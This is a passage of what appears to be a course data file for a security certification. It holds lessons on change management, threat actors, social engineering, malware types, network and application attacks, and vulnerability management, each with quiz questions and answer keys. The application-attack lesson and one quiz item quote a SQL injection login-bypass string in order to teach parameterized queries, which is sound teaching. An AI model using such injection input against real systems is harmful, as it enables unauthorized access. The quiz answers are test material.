            content: "**DNS Sinkholes:**\n- Redirect malicious DNS queries to controlled server\n- Blocks malware C2 communication\n- Identifies infected systems trying to reach bad domains\n\n**Fake Telemetry:**\n- Feed false information to attackers\n- Waste attacker time and resources\n- Cause attackers to make mistakes\n\n**Benefits of Deception:**\n- Near-zero false positives (no legitimate use)\n- Early warning of breaches\n- Wastes attacker resources\n- Intelligence on attacker TTPs",
            key_points: [
              "DNS sinkholes redirect malicious queries",
              "Identifies infected systems attempting C2",
              "Deception has near-zero false positive rate",
              "Provides intelligence on attacker behavior"
            ],
            knowledge_check: {
              question: "What is the PRIMARY advantage of honeypots over traditional security controls?",
              options: [
                "They're cheaper to implement",
                "They have near-zero false positives",
                "They block more attacks",
                "They're easier to manage"
              ],
              correct: 1,
              explanation: "Honeypots have no legitimate business purpose, so any interaction is suspicious—near-zero false positives. Traditional controls generate many false positives."
            }
          }
        ],
        summary: {
          key_takeaways: [
            "Deception assumes breach and focuses on detection",
            "Honeypots attract attackers to fake systems",
            "Honeytokens are fake data that trigger on use",
            "DNS sinkholes block C2 communication"
          ],
          exam_essentials: [
            "Honeypot = decoy system; Honeynet = network of honeypots",
            "Honeytoken = fake data (credentials, records)",
            "DNS sinkhole = redirects malicious DNS queries",
            "Key benefit: near-zero false positives"
          ]
        }
      },
      {
        id: 'D1-LESSON-008',
        domain: 1,
        title: 'Change Management',
        difficulty: 'intermediate',
        duration: '45 min',
        introduction: {
          hook: "In 2017, a routine network configuration change at a major airline caused a massive IT outage that grounded 2,300 flights and cost over $100 million. A single contractor made an unauthorized change without following change management procedures. When it failed, there was no rollback plan.",
          learning_goals: [
            "Explain why change management is critical for security and availability",
            "Apply formal change management processes including CAB approval",
            "Conduct security impact assessments for proposed changes",
            "Implement version control and rollback capabilities"
          ]
        },
        sections: [
          {
            title: "Change Management Process",
            content: "**Change Request Workflow:**\n1. Request: Document proposed change\n2. Review: Assess impact, risk, dependencies\n3. Approval: CAB (Change Advisory Board) decision\n4. Schedule: Plan implementation window\n5. Implement: Execute change with rollback plan\n6. Verify: Confirm success\n7. Document: Update records\n\n**Change Types:**\n- Standard: Pre-approved, low risk, routine\n- Normal: Requires CAB review and approval\n- Emergency: Expedited for critical issues (documented after)\n\n**CAB (Change Advisory Board):**\n- Reviews proposed changes\n- Includes stakeholders (IT, security, business)\n- Assesses risk and approves/denies",
            key_points: [
              "All changes should be documented and approved",
              "CAB reviews non-standard changes",
              "Emergency changes need post-implementation documentation",
              "Rollback plans are essential"
            ],
            knowledge_check: {
              question: "A critical vulnerability requires an immediate patch during business hours. What type of change is this?",
              options: [
                "Standard change (pre-approved)",
                "Normal change (CAB approval)",
                "Emergency change (expedited process)",
                "Routine maintenance"
              ],
              correct: 2,
              explanation: "Emergency changes are expedited for critical issues. They still require documentation but approval happens faster or after implementation."
            }
          },
          {
            title: "Security Considerations in Change Management",
            content: "**Security Impact Assessment:**\n- Does change affect security controls?\n- New vulnerabilities introduced?\n- Compliance implications?\n- Access control changes?\n\n**Version Control:**\n- Track all configuration changes\n- Enable rollback to previous versions\n- Audit trail of who changed what, when\n\n**Rollback Planning:**\n- Every change needs a rollback plan\n- Test rollback procedures\n- Define rollback triggers (what indicates failure?)\n- Time limits for rollback decisions\n\n**Configuration Baselines:**\n- Known-good configurations\n- Compare current state to baseline\n- Detect unauthorized changes",
            key_points: [
              "Every change needs security impact assessment",
              "Version control enables rollback",
              "Baselines detect configuration drift",
              "Unauthorized changes indicate compromise"
            ],
            exam_tips: [
              "CAB = Change Advisory Board (approves changes)",
              "Configuration baseline = known-good state",
              "Emergency changes still need documentation"
            ],
            knowledge_check: {
              question: "After a change is implemented, systems begin behaving erratically. What should happen FIRST?",
              options: [
                "Open a trouble ticket for investigation",
                "Execute the rollback plan",
                "Call an emergency CAB meeting",
                "Document the issue for post-mortem"
              ],
              correct: 1,
              explanation: "Execute the rollback plan first to restore service. Investigation and documentation happen after stability is restored."
            }
          }
        ],
        summary: {
          key_takeaways: [
            "Change management prevents unauthorized modifications",
            "CAB reviews and approves changes",
            "Every change needs a rollback plan",
            "Configuration baselines detect drift"
          ],
          exam_essentials: [
            "Standard = pre-approved; Normal = CAB review; Emergency = expedited",
            "CAB = Change Advisory Board",
            "Rollback plan required for all changes",
            "Configuration baseline = known-good state"
          ]
        }
      },
      // ═════════════════════════════════════════════════════════════
      // DOMAIN 2: Threats, Vulnerabilities & Mitigations
      // ═════════════════════════════════════════════════════════════
      {
        id: 'D2-LESSON-001',
        domain: 2,
        title: 'Threat Actors & Motivations',
        difficulty: 'beginner',
        duration: '50 min',
        introduction: {
          hook: "In 2023, LockBit ransomware attacked over 1,700 organizations across 30 countries, extorting $91 million. Meanwhile, a 17-year-old breached Uber and Rockstar Games just to prove he could. Understanding WHO is attacking you is just as important as HOW they attack.",
          learning_goals: [
            "Classify threat actors by type, capability, and sophistication",
            "Analyze attacker motivations including financial, political, and ideological",
            "Differentiate between internal and external threats",
            "Apply threat actor knowledge to defensive strategies"
          ]
        },
        sections: [
          {
            title: "Threat Actor Types",
            content: "**Nation-State Actors:**\n- Government-sponsored\n- Highest sophistication and resources\n- Motivations: Espionage, sabotage, influence\n- Examples: APT28 (Russia), APT41 (China)\n\n**Organized Crime:**\n- Financially motivated\n- Professional operations\n- Ransomware-as-a-Service (RaaS)\n- Double extortion (encrypt + leak threat)\n\n**Hacktivists:**\n- Ideologically motivated\n- Political/social causes\n- Website defacement, data leaks\n- Anonymous, LulzSec\n\n**Insider Threats:**\n- Current/former employees, contractors\n- Types: Malicious, Negligent, Compromised\n- Bypass perimeter controls\n\n**Script Kiddies:**\n- Low sophistication\n- Use existing tools without understanding\n- Opportunistic, low persistence",
            key_points: [
              "Nation-states = highest capability, espionage/sabotage",
              "Organized crime = financially motivated, RaaS model",
              "Insiders bypass perimeter (malicious, negligent, compromised)",
              "Script kiddies = low skill, use existing tools"
            ],
            knowledge_check: {
              question: "An attacker group uses sophisticated custom malware, operates for months undetected, and targets defense contractors for intellectual property. What threat actor type is this MOST likely?",
              options: [
                "Organized crime group",
                "Nation-state actor",
                "Hacktivist collective",
                "Script kiddie"
              ],
              correct: 1,
              explanation: "Nation-state actors have the sophistication for custom malware, patience for long operations, and motivation for defense contractor IP theft (espionage)."
            }
          },
          {
            title: "Attack Frameworks",
            content: "**MITRE ATT&CK:**\n- Tactics (WHY): Goals attacker wants to achieve\n- Techniques (HOW): Methods to achieve tactics\n- Procedures: Specific implementations\n- Used for threat modeling and detection\n\n**Cyber Kill Chain (Lockheed Martin):**\n1. Reconnaissance: Research target\n2. Weaponization: Create malware\n3. Delivery: Send to target (email, web)\n4. Exploitation: Trigger vulnerability\n5. Installation: Install malware\n6. Command & Control: Establish communication\n7. Actions on Objectives: Achieve goal\n\n**Defense Strategy:**\n- Break the chain at any stage\n- Earlier detection = less damage\n- Multiple detection opportunities",
            key_points: [
              "MITRE ATT&CK: Tactics (why) + Techniques (how)",
              "Kill Chain: 7 stages from recon to objectives",
              "Earlier detection = less damage",
              "Frameworks guide detection and response"
            ],
            knowledge_check: {
              question: "According to the Cyber Kill Chain, what stage comes immediately AFTER an attacker exploits a vulnerability?",
              options: [
                "Weaponization",
                "Delivery",
                "Installation",
                "Command & Control"
              ],
              correct: 2,
              explanation: "After Exploitation (triggering the vulnerability), the attacker performs Installation (establishing persistence). Then C2, then Actions on Objectives."
            }
          }
        ],
        summary: {
          key_takeaways: [
            "Nation-states = highest capability, espionage motivation",
            "Organized crime = profit-driven, RaaS model",
            "Insider threats bypass perimeter controls",
            "MITRE ATT&CK maps tactics and techniques"
          ],
          exam_essentials: [
            "Nation-state = most sophisticated, espionage/sabotage",
            "RaaS = Ransomware-as-a-Service",
            "Double extortion = encrypt + threaten data leak",
            "Kill Chain: Recon → Weaponize → Deliver → Exploit → Install → C2 → Actions"
          ]
        }
      },
      {
        id: 'D2-LESSON-002',
        domain: 2,
        title: 'Threat Vectors & Attack Surfaces',
        difficulty: 'intermediate',
        duration: '50 min',
        introduction: {
          hook: "The SolarWinds attack compromised 18,000 organizations through a trusted software update. Attackers didn't breach these organizations directly—they compromised the supply chain. Understanding threat vectors helps you protect all entry points.",
          learning_goals: [
            "Identify common threat vectors (email, web, supply chain, wireless)",
            "Calculate and minimize attack surface",
            "Understand supply chain attack risks",
            "Implement vector-specific defenses"
          ]
        },
        sections: [
          {
            title: "Common Threat Vectors",
            content: "**Message-Based Vectors:**\n- Email: Phishing, malicious attachments\n- SMS (Smishing): Text-based phishing\n- Instant messaging: Malware links\n\n**Web-Based Vectors:**\n- Drive-by downloads\n- Watering hole attacks (compromise sites victims visit)\n- Malvertising (malicious ads)\n\n**Removable Media:**\n- USB drives (BadUSB, Rubber Ducky)\n- CDs/DVDs with autorun malware\n\n**Wireless Vectors:**\n- Evil twin (fake access point)\n- Rogue access points\n- Bluetooth attacks (Bluesnarfing, Bluebugging)\n\n**Supply Chain:**\n- Compromised software updates\n- Hardware tampering\n- Third-party vendor breaches",
            key_points: [
              "Email/phishing is most common initial vector",
              "Supply chain targets trusted vendors",
              "USB attacks remain effective (BadUSB)",
              "Evil twin impersonates legitimate WiFi"
            ],
            knowledge_check: {
              question: "Attackers compromise a popular industry website knowing their targets visit it regularly. What attack is this?",
              options: [
                "Spear phishing",
                "Watering hole attack",
                "Drive-by download",
                "Typosquatting"
              ],
              correct: 1,
              explanation: "Watering hole attacks compromise websites that targets frequently visit—like predators waiting at a watering hole."
            }
          },
          {
            title: "Attack Surface Management",
            content: "**Attack Surface = Total of all entry points**\n\n**Components:**\n- Network exposure (open ports, services)\n- Application interfaces (APIs, web apps)\n- Human factors (employees, social engineering)\n- Physical access points\n- Supply chain connections\n\n**Reduction Strategies:**\n- Disable unnecessary services\n- Close unused ports\n- Patch and update regularly\n- Network segmentation\n- Least privilege access\n- Vendor security requirements\n\n**Software Bill of Materials (SBOM):**\n- Inventory of software components\n- Track dependencies\n- Identify vulnerable components\n- Required for supply chain security",
            key_points: [
              "Attack surface = all potential entry points",
              "Reduce by disabling unnecessary services/ports",
              "SBOM tracks software components",
              "Segmentation limits breach impact"
            ],
            knowledge_check: {
              question: "Which is the MOST effective way to reduce attack surface?",
              options: [
                "Install more security tools",
                "Disable unnecessary services and close unused ports",
                "Increase monitoring and logging",
                "Train users on security awareness"
              ],
              correct: 1,
              explanation: "Reducing attack surface means eliminating entry points entirely. Disabling unnecessary services and closing ports removes potential targets."
            }
          }
        ],
        summary: {
          key_takeaways: [
            "Email/phishing is most common initial access vector",
            "Supply chain attacks target trusted vendors",
            "Attack surface = total entry points (reduce aggressively)",
            "SBOM tracks software components for supply chain security"
          ],
          exam_essentials: [
            "Watering hole = compromise sites victims visit",
            "Evil twin = fake AP with same SSID",
            "BadUSB = reprogrammed USB firmware",
            "SBOM = Software Bill of Materials"
          ]
        }
      },
      {
        id: 'D2-LESSON-003',
        domain: 2,
        title: 'Social Engineering',
        difficulty: 'intermediate',
        duration: '55 min',
        introduction: {
          hook: "In 2020, a 17-year-old hacker breached Twitter by calling employees and convincing them he was from IT. Within hours, he controlled accounts of Barack Obama, Elon Musk, and Apple. Social engineering attacks target the human mind.",
          learning_goals: [
            "Identify social engineering techniques (phishing, pretexting, baiting)",
            "Recognize psychological principles exploited (authority, urgency)",
            "Differentiate phishing variants (spear phishing, whaling, BEC)",
            "Implement defenses against social engineering"
          ]
        },
        sections: [
          {
            title: "Psychological Principles Exploited",
            content: "**Authority:**\n- People comply with perceived authority figures\n- Impersonating executives, IT, law enforcement\n- 'The CEO needs this immediately'\n\n**Urgency/Scarcity:**\n- Time pressure prevents careful thinking\n- 'Your account will be closed in 24 hours'\n- Fear of missing out (FOMO)\n\n**Social Proof:**\n- People follow what others do\n- 'Other employees have already completed this'\n\n**Reciprocity:**\n- Obligation to return favors\n- Attacker provides small help first\n\n**Liking:**\n- People comply with those they like\n- Building rapport and common ground",
            key_points: [
              "Authority and urgency most commonly exploited",
              "Time pressure prevents careful thinking",
              "Attackers build trust before exploiting it",
              "Social proof leverages herd mentality"
            ],
            knowledge_check: {
              question: "An email claims to be from IT, says the recipient's password expires in 2 hours, and includes a link to 'reset' it. Which psychological principles are being exploited?",
              options: [
                "Reciprocity and liking",
                "Authority and urgency",
                "Social proof and scarcity",
                "Commitment and consistency"
              ],
              correct: 1,
              explanation: "The email uses Authority (IT department) and Urgency (2-hour deadline) to pressure quick action without careful thinking."
            }
          },
          {
            title: "Phishing Variants",
            content: "**Standard Phishing:**\n- Mass emails to many recipients\n- Generic content, brand impersonation\n- Relies on volume\n\n**Spear Phishing:**\n- Targeted at specific individuals/organizations\n- Personalized using research\n- Higher success rate\n\n**Whaling:**\n- Targets executives ('big fish')\n- Highly sophisticated\n- Often involves financial fraud\n\n**Business Email Compromise (BEC):**\n- Impersonates executives or partners\n- Requests wire transfers or sensitive data\n- $2.7 billion in annual losses\n\n**Vishing/Smishing:**\n- Vishing = voice phishing (phone calls)\n- Smishing = SMS phishing (text messages)\n- Often combined with email attacks",
            key_points: [
              "Phishing = mass; Spear phishing = targeted",
              "Whaling targets executives",
              "BEC = wire fraud through email impersonation",
              "Vishing = voice; Smishing = SMS"
            ],
            exam_tips: [
              "BEC is about financial fraud, not malware",
              "Spear phishing uses research for personalization",
              "Vishing = Voice; Smishing = SMS"
            ],
            knowledge_check: {
              question: "An attacker sends an email appearing to be from the CFO to the accounts payable department requesting an urgent wire transfer to a new vendor. What attack is this?",
              options: [
                "Spear phishing",
                "Whaling",
                "Business Email Compromise (BEC)",
                "Pretexting"
              ],
              correct: 2,
              explanation: "Business Email Compromise (BEC) impersonates executives to request fraudulent wire transfers. It's about financial fraud, not malware delivery."
            }
          }
        ],
        summary: {
          key_takeaways: [
            "Social engineering exploits human psychology",
            "Authority and urgency are most exploited principles",
            "BEC causes billions in annual losses",
            "Defense requires training + technical controls"
          ],
          exam_essentials: [
            "Phishing = mass; Spear phishing = targeted; Whaling = executives",
            "BEC = wire fraud through executive impersonation",
            "Vishing = voice; Smishing = SMS",
            "Out-of-band verification = separate channel with known contact"
          ]
        }
      },
      {
        id: 'D2-LESSON-004',
        domain: 2,
        title: 'Malware Types',
        difficulty: 'intermediate',
        duration: '50 min',
        introduction: {
          hook: "WannaCry ransomware infected 230,000 computers across 150 countries in four days. Hospitals cancelled surgeries, factories stopped production. Understanding malware types, behaviors, and indicators is essential for detection and defense.",
          learning_goals: [
            "Classify malware by type, propagation, and payload",
            "Differentiate between viruses, worms, trojans, ransomware",
            "Identify indicators of malware infection",
            "Apply detection and prevention controls"
          ]
        },
        sections: [
          {
            title: "Malware Classification",
            content: "**Virus:**\n- Requires host file\n- Needs user action to spread\n- Types: Boot sector, file, macro, polymorphic\n\n**Worm:**\n- Self-propagating across networks\n- No user action needed\n- Examples: WannaCry, Conficker\n\n**Trojan:**\n- Disguised as legitimate software\n- Doesn't self-replicate\n- Often includes backdoor (RAT)\n\n**Ransomware:**\n- Encrypts data for ransom\n- Double extortion = encrypt + threaten to leak\n- RaaS = Ransomware-as-a-Service\n\n**Rootkit:**\n- Hides malware presence\n- Levels: User-mode, Kernel, Firmware, Hypervisor\n- Kernel rootkits are hardest to detect",
            key_points: [
              "Virus needs host + user action",
              "Worm self-propagates without user action",
              "Trojan disguises as legitimate software",
              "Rootkit HIDES other malware"
            ],
            knowledge_check: {
              question: "Malware spreads across the network automatically without any user clicking links or opening attachments. What type is this?",
              options: [
                "Virus",
                "Worm",
                "Trojan",
                "Spyware"
              ],
              correct: 1,
              explanation: "Worms self-propagate across networks without user action. Viruses require user action to spread."
            }
          },
          {
            title: "Advanced Malware and IOCs",
            content: "**Fileless Malware:**\n- Operates in memory only\n- Uses legitimate tools (PowerShell, WMI)\n- No files to detect on disk\n- LOLBins (Living Off the Land Binaries)\n\n**Logic Bomb:**\n- Triggers on specific condition\n- Date, event, user action\n- Often planted by insiders\n\n**Indicators of Compromise (IOCs):**\n- Network: Unusual traffic, C2 beacons, DNS anomalies\n- Host: Unknown processes, registry changes, file modifications\n- Behavioral: Unusual login times, data exfiltration patterns\n\n**Sharing Formats:**\n- STIX: Structured threat information format\n- TAXII: Transport protocol for sharing",
            key_points: [
              "Fileless malware lives in memory, uses legitimate tools",
              "Logic bombs trigger on specific conditions",
              "IOCs: Network, host, and behavioral indicators",
              "STIX = format; TAXII = transport"
            ],
            knowledge_check: {
              question: "A disgruntled employee plants code that will delete databases if their user account is disabled. What type of malware is this?",
              options: [
                "Ransomware",
                "Worm",
                "Logic bomb",
                "Rootkit"
              ],
              correct: 2,
              explanation: "Logic bombs trigger on specific conditions—in this case, the employee's account being disabled."
            }
          }
        ],
        summary: {
          key_takeaways: [
            "Virus needs host + user action; Worm self-propagates",
            "Ransomware encrypts; Double extortion adds leak threat",
            "Rootkit HIDES malware at various levels",
            "Fileless malware uses legitimate tools (LOLBins)"
          ],
          exam_essentials: [
            "Virus = needs host + user; Worm = self-propagates",
            "RAT = Remote Access Trojan",
            "Rootkit levels: User → Kernel → Firmware → Hypervisor",
            "STIX = format; TAXII = transport protocol"
          ]
        }
      },
      {
        id: 'D2-LESSON-005',
        domain: 2,
        title: 'Network Attacks',
        difficulty: 'intermediate',
        duration: '55 min',
        introduction: {
          hook: "In a man-in-the-middle attack, an attacker can read and modify communications between two parties who believe they're communicating directly. Network attacks target the infrastructure that connects systems.",
          learning_goals: [
            "Identify common network attacks (DoS, MitM, ARP poisoning)",
            "Understand DNS attacks and their impact",
            "Recognize wireless network attacks",
            "Implement network attack defenses"
          ]
        },
        sections: [
          {
            title: "Denial of Service Attacks",
            content: "**DoS (Denial of Service):**\n- Overwhelm target to deny service\n- Single source attack\n- Flood attacks, resource exhaustion\n\n**DDoS (Distributed Denial of Service):**\n- Multiple sources (botnet)\n- Much harder to block\n- Types: Volumetric, Protocol, Application\n\n**Amplification Attacks:**\n- Small request generates large response\n- DNS amplification (UDP, spoofed source)\n- NTP amplification\n- Memcached amplification\n\n**Defenses:**\n- Rate limiting\n- Traffic scrubbing services\n- CDN distribution\n- Blackholing (drop traffic)",
            key_points: [
              "DoS = single source; DDoS = multiple sources (botnet)",
              "Amplification uses spoofed source, small request → large response",
              "CDN and scrubbing services help mitigate",
              "Rate limiting reduces impact"
            ],
            knowledge_check: {
              question: "Attackers send small DNS queries with a spoofed source IP (the victim's IP), causing large DNS responses to flood the victim. What attack is this?",
              options: [
                "DNS poisoning",
                "DNS amplification",
                "DNS tunneling",
                "DNS hijacking"
              ],
              correct: 1,
              explanation: "DNS amplification uses the amplification factor (small query → large response) with spoofed source to flood the victim."
            }
          },
          {
            title: "Man-in-the-Middle Attacks",
            content: "**ARP Poisoning/Spoofing:**\n- Attacker sends fake ARP responses\n- Associates attacker's MAC with victim's IP\n- Traffic flows through attacker\n\n**DNS Poisoning:**\n- Corrupt DNS cache with false records\n- Redirect victims to attacker-controlled sites\n- DNSSEC prevents this\n\n**SSL Stripping:**\n- Downgrade HTTPS to HTTP\n- Attacker intercepts unencrypted traffic\n- HSTS (HTTP Strict Transport Security) prevents\n\n**On-Path Attack:**\n- Modern term for MitM\n- Attacker positioned between two parties\n- Can read and modify traffic",
            key_points: [
              "ARP poisoning redirects traffic at Layer 2",
              "DNS poisoning redirects at name resolution",
              "SSL stripping downgrades HTTPS to HTTP",
              "DNSSEC protects DNS; HSTS protects HTTPS"
            ],
            exam_tips: [
              "ARP = Layer 2; DNS = Layer 7",
              "DNSSEC = DNS security",
              "HSTS = force HTTPS (prevents SSL stripping)"
            ],
            knowledge_check: {
              question: "An attacker sends forged ARP replies to associate their MAC address with the default gateway's IP address. What attack is this?",
              options: [
                "DNS poisoning",
                "ARP poisoning",
                "MAC flooding",
                "VLAN hopping"
              ],
              correct: 1,
              explanation: "ARP poisoning sends fake ARP responses to redirect traffic through the attacker by associating their MAC with legitimate IPs."
            }
          }
        ],
        summary: {
          key_takeaways: [
            "DDoS uses botnets; Amplification multiplies attack power",
            "ARP poisoning redirects traffic at Layer 2",
            "DNS poisoning corrupts name resolution",
            "DNSSEC and HSTS protect against these attacks"
          ],
          exam_essentials: [
            "DoS = single source; DDoS = distributed (botnet)",
            "Amplification = spoofed source + response larger than request",
            "ARP poisoning = Layer 2 MitM",
            "DNSSEC = DNS integrity; HSTS = force HTTPS"
          ]
        }
      },
      {
        id: 'D2-LESSON-006',
        domain: 2,
        title: 'Application Attacks',
        difficulty: 'intermediate',
        duration: '55 min',
        introduction: {
          hook: "The Equifax breach exposed 147 million Americans' data through a single Apache Struts vulnerability. Application vulnerabilities are the most common entry point because every line of code is a potential weakness.",
          learning_goals: [
            "Understand injection attacks (SQL, command, LDAP, XML)",
            "Analyze cross-site scripting (XSS) variants",
            "Evaluate authentication and session vulnerabilities",
            "Apply secure coding principles"
          ]
        },
        sections: [
          {
            title: "Injection Attacks",
            content: "**SQL Injection:**\n- Inject malicious SQL into queries\n- ' OR '1'='1 bypasses authentication\n- Union attacks extract data\n- Prevention: Parameterized queries, input validation\n\n**Command Injection:**\n- Inject OS commands through application\n- Often through unsanitized input\n- Prevention: Never pass user input to shell\n\n**LDAP Injection:**\n- Manipulate LDAP queries\n- Bypass authentication or extract data\n\n**XML Injection (XXE):**\n- External Entity injection\n- Read local files, SSRF\n- Prevention: Disable external entities",
            key_points: [
              "SQL injection is most common web vulnerability",
              "Parameterized queries prevent SQL injection",
              "Never pass user input directly to shell/OS",
              "XXE can read local files"
            ],
            knowledge_check: {
              question: "A developer writes: SELECT * FROM users WHERE username = '$input'. An attacker enters ' OR '1'='1' --. What vulnerability is this?",
              options: [
                "Cross-site scripting",
                "SQL injection",
                "Command injection",
                "LDAP injection"
              ],
              correct: 1,
              explanation: "SQL injection. The input modifies the SQL query logic. The -- comments out the rest. Parameterized queries would prevent this."
            }
          },
          {
            title: "Cross-Site Scripting (XSS)",
            content: "**Reflected XSS:**\n- Malicious script in URL parameter\n- Server reflects it back immediately\n- Requires victim to click malicious link\n\n**Stored XSS:**\n- Script stored on server (database)\n- Affects all users who view the content\n- More dangerous than reflected\n\n**DOM-Based XSS:**\n- Script executed by client-side JavaScript\n- Never sent to server\n- Manipulation of DOM environment\n\n**Prevention:**\n- Input validation\n- Output encoding\n- Content Security Policy (CSP)\n- HTTPOnly cookies (prevents JS access)",
            key_points: [
              "Reflected = immediate echo; Stored = persisted in database",
              "Stored XSS is most dangerous (affects all viewers)",
              "DOM-based happens entirely client-side",
              "CSP and output encoding are key defenses"
            ],
            exam_tips: [
              "Stored XSS = most dangerous (persistent)",
              "CSP = Content Security Policy (restricts script sources)",
              "HTTPOnly = cookie inaccessible to JavaScript"
            ],
            knowledge_check: {
              question: "An attacker posts a comment containing malicious JavaScript on a forum. Every user who views the comment gets their session cookie stolen. What attack is this?",
              options: [
                "Reflected XSS",
                "Stored XSS",
                "DOM-based XSS",
                "CSRF"
              ],
              correct: 1,
              explanation: "Stored XSS—the malicious script is stored on the server and served to every user who views the page."
            }
          }
        ],
        summary: {
          key_takeaways: [
            "SQL injection is most common; use parameterized queries",
            "Stored XSS is most dangerous (persistent)",
            "Input validation + output encoding prevent most attacks",
            "CSP restricts allowed script sources"
          ],
          exam_essentials: [
            "SQL injection: parameterized queries prevent",
            "Stored XSS = persistent; Reflected XSS = immediate",
            "CSP = Content Security Policy",
            "HTTPOnly = cookies inaccessible to JavaScript"
          ]
        }
      },
      {
        id: 'D2-LESSON-007',
        domain: 2,
        title: 'Vulnerability Management',
        difficulty: 'intermediate',
        duration: '50 min',
        introduction: {
          hook: "The average time to patch critical vulnerabilities is 60+ days. Attackers exploit vulnerabilities within hours of disclosure. Vulnerability management bridges this gap through continuous identification, prioritization, and remediation.",
          learning_goals: [
            "Implement vulnerability scanning and assessment",
            "Prioritize vulnerabilities using CVSS and business context",
            "Understand responsible disclosure processes",
            "Manage patch deployment effectively"
          ]
        },
        sections: [
          {
            title: "Vulnerability Identification",
            content: "**Vulnerability Scanning:**\n- Credentialed: Logs in, deeper scan, more accurate\n- Non-credentialed: External perspective, more false positives\n- Network-based vs Agent-based\n\n**CVSS (Common Vulnerability Scoring System):**\n- Base score: Intrinsic characteristics (0-10)\n- Temporal: Changes over time (exploit available?)\n- Environmental: Your specific context\n- Critical: 9.0-10.0\n- High: 7.0-8.9\n- Medium: 4.0-6.9\n- Low: 0.1-3.9\n\n**CVE (Common Vulnerabilities and Exposures):**\n- Unique identifier for vulnerabilities\n- CVE-YEAR-NUMBER format",
            key_points: [
              "Credentialed scans are more accurate",
              "CVSS: Base + Temporal + Environmental",
              "Critical = 9.0+; High = 7.0+",
              "CVE provides unique vulnerability IDs"
            ],
            knowledge_check: {
              question: "Which type of vulnerability scan provides the MOST accurate results?",
              options: [
                "Non-credentialed external scan",
                "Credentialed internal scan",
                "Passive network monitoring",
                "Manual penetration test"
              ],
              correct: 1,
              explanation: "Credentialed scans log into systems and can see installed software, configurations, and patches—providing more accurate results with fewer false positives."
            }
          },
          {
            title: "Remediation and Patch Management",
            content: "**Prioritization Factors:**\n- CVSS score\n- Asset criticality\n- Exploit availability (in the wild?)\n- Compensating controls\n- Business impact\n\n**Patch Management Process:**\n1. Identify applicable patches\n2. Test in non-production environment\n3. Deploy to pilot group\n4. Roll out to production\n5. Verify successful installation\n\n**When Patching Isn't Possible:**\n- Compensating controls\n- Network segmentation\n- Enhanced monitoring\n- Acceptance with documentation\n\n**Zero-Day:**\n- Vulnerability with no patch available\n- Exploit exists before vendor awareness",
            key_points: [
              "Prioritize by CVSS + asset criticality + exploit availability",
              "Test patches before production deployment",
              "Compensating controls when patching not possible",
              "Zero-day = no patch available yet"
            ],
            knowledge_check: {
              question: "A CVSS 6.5 vulnerability exists on a critical database server, while a CVSS 8.0 vulnerability exists on a test server. Which should be patched FIRST?",
              options: [
                "CVSS 8.0 test server (higher score)",
                "CVSS 6.5 database server (higher asset value)",
                "Both simultaneously",
                "Neither, scores are acceptable"
              ],
              correct: 1,
              explanation: "The critical database server should be prioritized despite lower CVSS because asset criticality is a key factor. CVSS alone doesn't determine priority."
            }
          }
        ],
        summary: {
          key_takeaways: [
            "Credentialed scans are more accurate than non-credentialed",
            "CVSS + asset criticality + exploit availability = priority",
            "Test patches before production deployment",
            "Compensating controls when patching isn't possible"
          ],
          exam_essentials: [
            "CVSS: Critical (9+), High (7-8.9), Medium (4-6.9), Low (<4)",
            "CVE = unique vulnerability identifier",
            "Zero-day = no patch available",
            "Credentialed > Non-credentialed for accuracy"
          ]
        }
      },
      {
        id: 'D2-LESSON-008',
        domain: 2,
        title: 'Indicators of Compromise',
        difficulty: 'intermediate',
        duration: '45 min',
        introduction: {
          hook: "The average time to detect a breach is 197 days. Organizations that detect quickly share something: they know what to look for. IOCs and IOAs help identify attacks in progress.",
          learning_goals: [
            "Differentiate between IOCs and IOAs",
            "Identify network, host, and behavioral indicators",
            "Understand detection technologies",
            "Apply threat intelligence to detection"
          ]
        },
        sections: [
          {
            title: "Indicator Types",
            content: "**Indicators of Compromise (IOCs):**\n- Evidence that attack has occurred\n- Forensic artifacts\n- IP addresses, file hashes, domains\n- Reactive (after the fact)\n\n**Indicators of Attack (IOAs):**\n- Behaviors suggesting attack in progress\n- Focus on attacker actions, not artifacts\n- Proactive (during the attack)\n- More effective against novel attacks\n\n**Network Indicators:**\n- Unusual traffic patterns\n- C2 beacons (regular check-ins)\n- DNS anomalies (tunneling, DGA)\n- Data exfiltration patterns\n\n**Host Indicators:**\n- Unknown processes\n- Registry modifications\n- File changes\n- Unusual scheduled tasks",
            key_points: [
              "IOCs = evidence of past attack (artifacts)",
              "IOAs = signs of attack in progress (behaviors)",
              "IOAs catch novel attacks better than IOCs",
              "C2 beacons = regular malware check-ins"
            ],
            knowledge_check: {
              question: "Security tools detect PowerShell downloading and executing code from an unusual URL. Is this an IOC or IOA?",
              options: [
                "IOC—PowerShell activity is logged",
                "IOA—this describes attack behavior in progress",
                "Neither—PowerShell is legitimate",
                "Both—it's evidence and behavior"
              ],
              correct: 1,
              explanation: "This is an IOA—it describes suspicious behavior (PowerShell downloading and executing code) indicating an attack in progress, rather than forensic artifacts."
            }
          }
        ],
        summary: {
          key_takeaways: [
            "IOCs = artifacts; IOAs = behaviors",
            "IOAs detect novel attacks better",
            "C2 beacons = regular malware check-ins",
            "DGA = Domain Generation Algorithm (evasion)"
          ],
          exam_essentials: [
            "IOC = evidence of compromise (reactive)",
            "IOA = behavior of attack (proactive)",
            "STIX = format; TAXII = transport",
            "Beaconing = regular C2 communication"
          ]
        }
      },
      {
        id: 'D2-LESSON-009',
        domain: 2,
        title: 'Hardening & Configurations',
        difficulty: 'intermediate',
        duration: '50 min',
        introduction: {
          hook: "80% of breaches involve misconfigurations. Hardening reduces attack surface by securing default configurations, removing unnecessary components, and applying security baselines.",
          learning_goals: [
            "Apply system hardening techniques",
            "Implement security baselines (CIS, DISA STIGs)",
            "Secure various system types",
            "Detect configuration drift"
          ]
        },
        sections: [
          {
            title: "Hardening Principles",
            content: "**Core Hardening Steps:**\n- Remove unnecessary services/software\n- Change default credentials\n- Disable unnecessary ports\n- Apply patches and updates\n- Implement least privilege\n- Enable logging and monitoring\n\n**Security Baselines:**\n- CIS Benchmarks: Industry standard\n- DISA STIGs: DoD standards\n- Vendor hardening guides\n- Organizational baselines\n\n**Configuration Management:**\n- Document standard configurations\n- Automate deployment\n- Detect drift from baseline\n- Version control for configs",
            key_points: [
              "Remove/disable unnecessary services",
              "Always change default credentials",
              "CIS Benchmarks = industry standard",
              "Detect and remediate configuration drift"
            ],
            knowledge_check: {
              question: "An auditor finds systems have deviated from the approved security baseline over time. What is this called?",
              options: [
                "Security degradation",
                "Configuration drift",
                "Baseline creep",
                "Policy violation"
              ],
              correct: 1,
